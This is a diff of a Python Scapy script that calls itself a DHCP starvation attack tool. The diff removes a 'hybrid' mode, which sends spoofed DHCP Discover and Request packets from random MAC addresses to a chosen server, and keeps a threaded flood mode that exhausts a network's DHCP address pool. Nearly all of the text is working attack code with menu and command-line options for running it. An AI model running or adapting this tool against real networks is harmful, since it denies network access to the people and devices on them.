@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# DHCP Starvation Attack Tool with Real-Time Progress & Hybrid Option
+# DHCP Starvation Attack Tool with Real-Time Progress (Normal Mode Only)
 
 import argparse
 import threading
@@ -97,39 +97,10 @@ def NormalWorker(interface, packetsPerThread):
             stop_filter=lambda x: False
         )
 
-def HybridWorker(interface, serverIp, prefix, packetsPerThread):
-    global packetsSent
-    conf.iface = interface
-    for _ in range(packetsPerThread):
-        if stopAttack:
-            break
-        mac = GenerateMac()
-        # Discover
-        discoverPkt, xid = BuildDiscover(mac)
-        sendp(discoverPkt, verbose=False)
-        packetsSent += 1
-        # Immediate Request
-        randomIp = f"{prefix}.{random.randint(1,254)}"
-        req = BuildRequest(mac, xid, randomIp, serverIp)
-        sendp(req, verbose=False)
-        packetsSent += 1
-        # Brief ACK sniff
-        sniff(
-            filter="udp and (port 67 or 68)",
-            prn=lambda p: None,
-            timeout=0.5,
-            iface=interface,
-            stop_filter=lambda p: BOOTP in p and p[BOOTP].xid==xid and DHCP in p and any(o[0]=="message-type" and o[1]==5 for o in p[DHCP].options)
-        )
-
-def StartAttack(interface, threadsCount, packetsPerThread, hybridMode, serverIp=None, prefix=None):
+def StartAttack(interface, threadsCount, packetsPerThread):
     global stopTimer, timerThread
     conf.iface = interface
-    mode = "HYBRID" if hybridMode else "NORMAL"
-    print(f"{RED}Starting {mode} DHCP starvation on {interface}{RESET}")
-    if hybridMode:
-        print(f" → Server IP: {serverIp}")
-        print(f" → Subnet prefix: {prefix}.x")
+    print(f"{RED}Starting NORMAL DHCP starvation on {interface}{RESET}")
 
     startTime = time.time()
     stopTimer  = False
@@ -137,10 +108,8 @@ def StartAttack(interface, threadsCount, packetsPerThread, hybridMode, serverIp=
     timerThread.start()
 
     threads = []
-    worker = HybridWorker if hybridMode else NormalWorker
     for _ in range(threadsCount):
-        args = (interface, serverIp, prefix, packetsPerThread) if hybridMode else (interface, packetsPerThread)
-        t = threading.Thread(target=worker, args=args)
+        t = threading.Thread(target=NormalWorker, args=(interface, packetsPerThread))
         t.start()
         threads.append(t)
 
@@ -159,27 +128,15 @@ def menu():
     interface = input(f"{RED}Interface (e.g. eth0): {RESET}").strip()
     threads   = int(input(f"{RED}Threads [10]: {RESET}") or "10")
     packets   = int(input(f"{RED}Packets per thread [50]: {RESET}") or "50")
-    hybrid    = input(f"{RED}Hybrid mode? (y/N): {RESET}").lower().startswith("y")
-    serverIp = prefix = None
-    if hybrid:
-        serverIp = input(f"{RED}DHCP server IP: {RESET}").strip()
-        subnet   = input(f"{RED}Subnet (e.g. 192.168.1.0/24): {RESET}").strip()
-        prefix   = subnet.rsplit(".",1)[0]
-    StartAttack(interface, threads, packets, hybrid, serverIp, prefix)
+    StartAttack(interface, threads, packets)
 
 def terminal():
     parser = argparse.ArgumentParser(description="DHCP Starvation Tool")
     parser.add_argument("-i","--interface", required=True)
     parser.add_argument("-t","--threads", type=int, default=10)
     parser.add_argument("-p","--packets", type=int, default=50)
-    parser.add_argument("--hybrid", action="store_true", help="Enable hybrid mode (blind handshake)")
-    parser.add_argument("--server", help="DHCP server IP (required for hybrid)")
-    parser.add_argument("--subnet", help="Subnet (e.g. 192.168.1.0/24) for hybrid")
     args = parser.parse_args()
-    if args.hybrid and (not args.server or not args.subnet):
-        parser.error("--server and --subnet required in hybrid mode")
-    prefix = args.subnet.rsplit(".",1)[0] if args.hybrid else None
-    StartAttack(args.interface, args.threads, args.packets, args.hybrid, args.server, prefix)
+    StartAttack(args.interface, args.threads, args.packets)
 
 def main():
     signal.signal(signal.SIGINT, SignalHandler)
